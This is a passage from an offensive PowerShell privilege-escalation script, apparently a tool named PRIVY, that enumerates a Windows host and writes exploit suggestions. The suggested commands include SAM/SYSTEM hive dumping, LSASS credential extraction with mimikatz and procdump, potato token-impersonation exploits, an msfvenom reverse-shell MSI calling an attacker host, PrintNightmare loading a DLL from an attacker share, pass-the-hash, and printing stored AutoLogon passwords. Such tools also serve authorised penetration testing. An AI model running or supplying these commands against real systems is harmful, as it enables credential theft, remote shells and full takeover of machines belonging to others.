Run-Cmd "Defender status" { Get-MpComputerStatus | Select-Object AMRunningMode,AntivirusEnabled,RealTimeProtectionEnabled | Format-List } $devtools
Run-Cmd "Tasklist AV check" { tasklist | Select-String -Pattern "defender|avg|avast|mcafee|sentinel|crowd|carbon|cylance|symantec|sophos|eset|bitdefender|kaspersky" -CaseSensitive:$false } $devtools

Separator $devtools
Write-Host "    [v] Saved -> $devtools`n" -ForegroundColor Green

# ============================================================================
#  12. EXPLOIT PATH SUGGESTIONS
# ============================================================================
Write-Host "`n=======================================================================" -ForegroundColor Magenta
Write-Host "  PHASE 12: EXPLOIT PATH SUGGESTIONS" -ForegroundColor Magenta
Write-Host "=======================================================================" -ForegroundColor Magenta

@"
======================================================================
  PRIVY -- EXPLOIT PATH SUGGESTIONS
  Generated: $(Get-Date)
  Host: $env:COMPUTERNAME | User: $env:USERNAME
======================================================================

  Priority key:
  [P1] Immediate -- run it now
  [P2] Likely SYSTEM -- needs a step or two
  [P3] Investigate -- depends on context

======================================================================

"@ | Out-File $exploit -Encoding UTF8

# -- P1: SeImpersonatePrivilege --------------------------------------------
if ($whoamiPriv -match "SeImpersonatePrivilege.*Enabled") {
    Exploit-Entry "P1" "SeImpersonatePrivilege ENABLED" @"
  PrintSpoofer (Windows 10/Server 2019+):
    .\PrintSpoofer.exe -i -c cmd
    https://github.com/itm4n/PrintSpoofer

  GodPotato (universal):
    .\GodPotato.exe -cmd "cmd /c whoami"
    https://github.com/BeichenDream/GodPotato

  JuicyPotatoNG:
    .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe"
    https://github.com/antonioCoco/JuicyPotatoNG
"@
}

# -- P1: SeBackupPrivilege -------------------------------------------------
if ($whoamiPriv -match "SeBackupPrivilege.*Enabled") {
    Exploit-Entry "P1" "SeBackupPrivilege ENABLED -- dump SAM/SYSTEM" @"
  Copy SAM and SYSTEM hives (bypass ACL with robocopy or reg save):
    reg save HKLM\SAM C:\Temp\SAM
    reg save HKLM\SYSTEM C:\Temp\SYSTEM
    reg save HKLM\SECURITY C:\Temp\SECURITY
  Transfer to attacker and extract:
    python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
  Or with Evil-WinRM SeBackupPrivilege abuse:
    https://github.com/mpgn/BackupOperatorToDA
"@
}

# -- P1: SeDebugPrivilege --------------------------------------------------
if ($whoamiPriv -match "SeDebugPrivilege.*Enabled") {
    Exploit-Entry "P1" "SeDebugPrivilege ENABLED -- LSASS dump" @"
  Dump LSASS with Task Manager (if GUI) or:
    .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
  Or via procdump:
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
  Transfer dump and parse offline:
    python3 pypykatz lsa minidump lsass.dmp
"@
}

# -- P1: SeRestorePrivilege ------------------------------------------------
if ($whoamiPriv -match "SeRestorePrivilege.*Enabled") {
    Exploit-Entry "P1" "SeRestorePrivilege ENABLED -- arbitrary file write" @"
  Pair with SeBackup to overwrite system files. Or hijack a service binary:
    1. Take ownership of target binary (with SeTakeOwnership) or use built-in restore.
    2. Replace C:\Program Files\<svc>\service.exe with a payload.
    3. Restart the service: sc stop <svc> && sc start <svc>
  Reference: https://github.com/giuliano108/SeBackupPrivilege
"@
}

# -- P1: SeTakeOwnershipPrivilege ------------------------------------------
if ($whoamiPriv -match "SeTakeOwnershipPrivilege.*Enabled") {
    Exploit-Entry "P1" "SeTakeOwnershipPrivilege ENABLED -- own any file" @"
  Take ownership of SAM/SYSTEM hives or a service binary:
    takeown /f C:\Windows\System32\config\SAM
    icacls C:\Windows\System32\config\SAM /grant <user>:F
  Then read or replace. Combine with SeRestore for end-to-end overwrite.
"@
}

# -- P1: SeLoadDriverPrivilege ---------------------------------------------
if ($whoamiPriv -match "SeLoadDriverPrivilege.*Enabled") {
    Exploit-Entry "P1" "SeLoadDriverPrivilege ENABLED -- kernel code execution" @"
  Load a vulnerable signed driver (BYOVD) for kernel-level RCE:
    https://github.com/TarlogicSecurity/EoPLoadDriver
    https://github.com/Cn33liz/EoPLoadDriver
  Common BYOVD targets: Capcom.sys, dbutil_2_3.sys, RTCore64.sys
  Reference: https://www.loldrivers.io/
"@
}

# -- P1: SeAssignPrimaryTokenPrivilege -------------------------------------
if ($whoamiPriv -match "SeAssignPrimaryTokenPrivilege.*Enabled") {
    Exploit-Entry "P1" "SeAssignPrimaryTokenPrivilege ENABLED -- token impersonation" @"
  Same potato attack family as SeImpersonate:
    .\GodPotato.exe -cmd "cmd /c whoami"
    .\PrintSpoofer.exe -i -c cmd
"@
}

# -- P2: SeManageVolumePrivilege -------------------------------------------
if ($whoamiPriv -match "SeManageVolumePrivilege.*Enabled") {
    Exploit-Entry "P2" "SeManageVolumePrivilege ENABLED -- write to System32" @"
  Grants FullControl on entire C:\ drive:
    https://github.com/CsEnox/SeManageVolumeExploit
    .\SeManageVolumeExploit.exe
  Then drop a DLL into System32 that a SYSTEM process loads (DLL hijack).
"@
}

# -- P1: AlwaysInstallElevated ---------------------------------------------
if ($aieHKLM -eq 1 -and $aieHKCU -eq 1) {
    Exploit-Entry "P1" "AlwaysInstallElevated -- MSI runs as SYSTEM" @"
  Generate payload:
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f msi -o shell.msi
  Execute on target:
    msiexec /quiet /qn /i shell.msi
"@
}

# -- P1: AutoLogon credentials ---------------------------------------------
if ($winlogon.DefaultPassword) {
    Exploit-Entry "P1" "AutoLogon credentials in registry" @"
  Username: $($winlogon.DefaultUserName)
  Password: $($winlogon.DefaultPassword)
  Try: runas /user:$($winlogon.DefaultUserName) cmd
  Or authenticate via Evil-WinRM / SMB / RDP with these credentials.
"@
}

# -- P1: cmdkey saved credentials ------------------------------------------
if ($cmdkeyResult -match "Target:") {
    Exploit-Entry "P1" "Saved credentials via cmdkey" @"
  List saved creds: cmdkey /list
  Use saved cred:   runas /savecred /user:<domain\user> "cmd /c <command>"
  E.g.:             runas /savecred /user:Administrator "cmd /c whoami > C:\Temp\out.txt"
"@
}

# -- P2: Unquoted service paths --------------------------------------------
if ($unquoted.Count -gt 0) {
    Exploit-Entry "P2" "Unquoted service path(s) found ($($unquoted.Count))" @"
  For a path like: C:\Program Files\My App\service.exe
  Plant payload at: C:\Program.exe or C:\Program Files\My.exe
  Then restart the service: sc stop <svc> && sc start <svc>
  Or wait for reboot if restart requires elevation.
  Paths found:
$(($unquoted | ForEach-Object { "    -> $_" }) -join "`n")
"@
}

# -- P2: PrintNightmare check ----------------------------------------------
$spoolerRunning = Get-Service Spooler -ErrorAction SilentlyContinue
$osBuild = [System.Environment]::OSVersion.Version.Build
if ($spoolerRunning.Status -eq "Running") {
    Exploit-Entry "P2" "Print Spooler is running -- check for PrintNightmare (CVE-2021-1675 / CVE-2021-34527)" @"
  Check if patched: Get-HotFix KB5004945, KB5004946, KB5004947, KB5004948, KB5004960
  If unpatched:
    https://github.com/cube0x0/CVE-2021-1675
    python3 CVE-2021-1675.py <domain>/<user>:<pass>@<target> '\\<attacker>\share\evil.dll'
  Or PowerShell:
    Import-Module .\CVE-2021-1675.ps1
    Invoke-Nightmare -NewUser "hacker" -NewPassword "Pass123!" -DriverName "PrintMe"
"@
}

# -- P2: LocalAccountTokenFilterPolicy ------------------------------------
if ($uac.LocalAccountTokenFilterPolicy -eq 1) {
    Exploit-Entry "P2" "LocalAccountTokenFilterPolicy=1 -- PTH over network enabled" @"
  Pass-the-Hash with local admin credentials:
    evil-winrm -i <target> -u Administrator -H <NTLM_hash>
    nxc smb <target> -u Administrator -H <NTLM_hash> -x "whoami"
    impacket-psexec Administrator@<target> -hashes :<NTLM_hash>
"@
}

# -- P3: AV disabled -------------------------------------------------------
$defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($defenderStatus -and -not $defenderStatus.AntivirusEnabled) {
    Exploit-Entry "P3" "Windows Defender is DISABLED -- drop payloads without evasion" @"
  AV is off. Unsigned or detected payloads may run freely.
  Generate and transfer payloads directly (msfvenom, nc.exe, mimikatz, etc.)
"@
}

# -- Finalise --------------------------------------------------------------
$exploitCount = (Select-String -Path $exploit -Pattern '^\[P' -ErrorAction SilentlyContinue).Count
Add-Content $exploit "`n======================================================================"
Add-Content $exploit "  Total exploit paths identified: $exploitCount"
Add-Content $exploit "======================================================================"

if ($exploitCount -gt 0) {
    Write-Host "`n    [v] Saved -> $exploit" -ForegroundColor Green
} else {
    Add-Content $exploit "`n  [--] No automated exploit paths matched. Review findings manually."
    Write-Host "`n    [--] No automated exploit paths matched -- review manually" -ForegroundColor Yellow
}

# ============================================================================
#  SUMMARY
# ============================================================================
$elapsed = [int]((Get-Date) - $startTime).TotalSeconds
$findingsCount = (Select-String -Path $findings -Pattern '^\[!!\]' -ErrorAction SilentlyContinue).Count

Add-Content $findings "`n======================================================================"
Add-Content $findings "  Total findings: $findingsCount"
Add-Content $findings "======================================================================"

Write-Host "`n=======================================================================" -ForegroundColor Cyan
Write-Host "  SCAN COMPLETE" -ForegroundColor Cyan
Write-Host "=======================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Duration  : ${elapsed}s"
Write-Host "  Output Dir: $(Get-Location)\$main"
Write-Host ""

if ($findingsCount -gt 0) {
    Write-Host "  +==================================================================+" -ForegroundColor Red
    Write-Host "  |  [!!] $findingsCount FINDING(S) DETECTED -- review 00-FINDINGS.txt          |" -ForegroundColor Red
    Write-Host "  +==================================================================+" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Findings Preview:" -ForegroundColor Red
    Write-Host "  -----------------------------------------"
    Select-String -Path $findings -Pattern '^\[!!\]' | ForEach-Object {
        Write-Host "    $($_.Line)" -ForegroundColor Red
    }
    Write-Host ""
} else {
    Write-Host "  [v] No critical findings detected." -ForegroundColor Green
    Write-Host ""
}

Write-Host "  Files Generated:" -ForegroundColor Green
Write-Host "  -----------------------------------------"
$allFiles = @($findings, $exploit, $sys, $ugo, $svc, $tasks, $reg, $netstuff, $creds, $sw_out, $fs, $history, $devtools)
foreach ($f in $allFiles) {
    if (Test-Path $f) {
        $size = [math]::Round((Get-Item $f).Length / 1KB, 1)
        Write-Host "    [+] $([System.IO.Path]::GetFileName($f))  (${size}KB)" -ForegroundColor Green
    }
}

Write-Host ""
Write-Host "  Tip: Get-Content $findings" -ForegroundColor Yellow
Write-Host "  Tip: Get-Content $exploit" -ForegroundColor Yellow
Write-Host "  Tip: Select-String -Path '$main\*' -Pattern 'password|FINDING'" -ForegroundColor Yellow
Write-Host ""
Write-Host "=======================================================================" -ForegroundColor Cyan
